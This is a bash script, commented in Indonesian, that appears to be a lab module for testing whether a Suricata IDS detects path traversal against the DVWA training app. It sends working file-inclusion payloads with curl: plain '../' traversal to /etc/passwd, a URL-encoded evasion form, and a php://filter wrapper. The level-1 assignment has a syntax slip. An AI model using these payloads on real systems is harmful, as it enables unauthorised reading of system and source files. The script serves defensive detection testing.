#!/bin/bash

# =================================================================
# MODUL 06: PATH TRAVERSAL (FILE INCLUSION)
# Strategi: 3 Level Depth (Basic, Encoding, Wrapper/Filter)
# Referensi: IDS Final Discuss (1).docx
# Target: DVWA (File Inclusion Page)
# =================================================================

# KONFIGURASI
TARGET_IP="192.168.x.x"
# Masukkan PHPSESSID valid dari browser
COOKIE="security=low; PHPSESSID=ganti_dengan_session_id_anda"
LOG_FILE="logs/trav_session_$(date +%F).log"

# URL Vulnerable di DVWA
BASE_URL="http://$TARGET_IP/dvwa/vulnerabilities/fi/?page="

echo "[+] [06_TRAV] Memulai Modul Path Traversal..."
echo "[+] Target: $BASE_URL"

if [[ "$COOKIE" == *"ganti_dengan"* ]]; then
   echo "[!] WARNING: Cookie belum di-set!"
fi

# -----------------------------------------------------------------
# LEVEL 1: BASIC TRAVERSAL (Noisy)
# Tujuan: Menguji rule standar "../" (Dot Dot Slash).
# Payload: ../../../../../etc/passwd
# -----------------------------------------------------------------
echo "[Level 1] Running Basic Traversal (/etc/passwd)..."
PAYLOAD = "../../../../../etc/passwd"
# Curl akan mengirim request: GET /.../?page=../../etc/passwd
curl -s -b "$COOKIE" "${BASE_URL}${PAYLOAD}" -o logs/trav_lvl1.txt
echo "    -> Selesai. (Harapan: Alert ET WEB_SERVER /etc/passwd Access)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 2: ENCODED TRAVERSAL (Evasion)
# Tujuan: Menguji kemampuan decoding URI Suricata.
# Teknik: Mengganti "/" dengan "%2f" dan "." dengan "%2e".
# Payload: ..%2f..%2f..%2fetc%2fpasswd
# -----------------------------------------------------------------
echo "[Level 2] Running URL Encoded Traversal..."
# Payload ini menguji apakah IDS melakukan 'URL Decode' sebelum inspeksi
PAYLOAD="..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
curl -s -b "$COOKIE" "${BASE_URL}${PAYLOAD}" -o logs/trav_lvl2.txt
echo "    -> Selesai. (Harapan: Deteksi Evasion atau tetap terdeteksi sebagai LFI)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 3: PHP WRAPPER (LFI to RCE Preparation)
# Tujuan: Menguji deteksi protokol PHP (bukan cuma path file).
# Teknik: Menggunakan 'php://filter' untuk membaca source code.
# Payload: php://filter/convert.base64-encode/resource=index.php
# -----------------------------------------------------------------
echo "[Level 3] Running PHP Filter Wrapper..."
# Ini teknik canggih untuk membaca source code PHP tanpa dieksekusi
PAYLOAD="php://filter/convert.base64-encode/resource=../../../../../etc/passwd"
curl -s -b "$COOKIE" "${BASE_URL}${PAYLOAD}" -o logs/trav_lvl3.txt
echo "    -> Selesai. (Harapan: Alert ET WEB_SERVER PHP wrapper)"

echo "[+] [06_TRAV] Modul Selesai pada $(date)"
echo "-----------------------------------------------------------"
